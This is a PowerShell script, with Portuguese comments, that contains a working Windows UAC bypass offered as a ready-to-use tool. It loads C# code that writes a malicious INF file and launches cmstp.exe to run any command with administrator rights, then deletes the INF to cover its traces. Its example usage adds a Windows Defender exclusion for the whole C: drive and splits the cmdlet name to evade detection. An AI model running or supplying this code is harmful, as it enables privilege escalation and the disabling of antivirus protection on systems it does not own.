function Invoke-UAC
{

<#
 
.SYNOPSIS

Este script serve para fazer um bypass de UAC (Controle de Contas de Usuário) em um Windows onde o usuário atual está no grupo de administradores e a configuração de UAC está no padrão. Se o UAC estiver configurado para notificar em qualquer mudança, o bypass não funcionará.

.DESCRIPTION

Este script usa código em C# para ser carregado na memória com PowerShell usando reflection, e então invoca a função `Execute` do código C# carregado, que executará o comando com altos privilégios (administrador).

.PARAMETER Executable

.PARAMETER Command

.EXAMPLE

Invoke-UAC -Executable "powershell" -Command ".('Add-MpP' + 'reference') -ExclusionPath C:\"

.EXAMPLE

Invoke-UAC -Executable "cmd"

.NOTES

Este script foi inspirado no blog de zc00l: https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$Executable,
 
    [Parameter()]
    [string]$Command
)

$InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

$code = @"
using System;
using System.Threading;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Runtime.InteropServices;

public class CMSTPBypass
{
    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

    [DllImport("user32.dll")]
    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    public static string SetInfFile(string CommandToExecute, string InfData)
    {
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append("C:\\windows\\temp");
        OutputFile.Append("\\");
        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("LINE", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool Execute(string CommandToExecute, string InfData)
    {
        const int WM_SYSKEYDOWN = 0x0100;
        const int VK_RETURN = 0x0D;

        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute, InfData));

        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + InfFile.ToString();
        IntPtr dptr = Marshal.AllocHGlobal(1);
        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments, "", 0);

        Thread.Sleep(3000);
        IntPtr WindowToFind = FindWindow(null, "CorpVPN");

        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);
        Thread.Sleep(5000);
        File.Delete(InfFile.ToString());
        return true;
    }
}
"@

$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
if ($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1) {
    Write-Host "UAC está configurado em 'Notificar sempre'. Este módulo não omite essa configuração"
    return
}

try {
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $adm = Get-LocalGroupMember -SID S-1-5-32-544 | Where-Object { $_.Name -eq $user }
} catch {
    $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $AdminGroupSID = 'S-1-5-32-544'
    $adminGroup = Get-WmiObject -Class Win32_Group | Where-Object { $_.SID -eq $AdminGroupSID }
    $members = $adminGroup.GetRelated("Win32_UserAccount")
    $members | ForEach-Object { if ($_.Caption -eq $User) { $adm = $true } }
}

if (!$adm) {
    Write-Host "O usuário atual não está no grupo de administradores"
    return
}

try {
    if (![System.IO.File]::Exists($Executable)) {
        $Ex = (Get-Command $Executable)
        if (![System.IO.File]::Exists($Ex.Source)) {
            $Executable = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Executable)
            if (![System.IO.File]::Exists($Executable)) {
                Write-Host "[!] Executável não encontrado"
                exit
            }
        } else {
            $Executable = (Get-Command $Executable).Name
        }
    }
} catch {
    Write-Host "[!] Erro na execução de Invoke-UAC, tente fechar o processo cmstp.exe"
    exit
}

if ($Executable.Contains("powershell")) {
    if ($Command -ne "") {
        $final = "powershell -NoExit -c ""$Command"""
    } else {
        $final = "$Executable $Command"
    }
} elseif ($Executable.Contains("cmd")) {
    if ($Command -ne "") {
        $final = "cmd /k ""$Command"""
    } else {
        $final = "$Executable $Command"
    }
} else {
    $final = "$Executable $Command"
}

function Execute {
    try {
        $result = [CMSTPBypass]::Execute($final, $InfData)
    } catch {
        Add-Type $code
        $result = [CMSTPBypass]::Execute($final, $InfData)
    }

    if ($result) {
        Write-Output "[*] Elevação bem-sucedida"
    } else {
        Write-Output "[!] Ocorreu um erro"
    }
}

$process = ((Get-WmiObject -Class win32_process).name | Select-String "cmstp" | Select-Object * -First 1).Pattern
if ($process -eq "cmstp") {
    try {
        Stop-Process -Name "cmstp" -Force
        Execute
    } catch {
        Write-Host "[!] Erro na execução de Invoke-UAC, tente fechar o processo cmstp.exe"
        exit
    }
} else {
    Execute
}
}
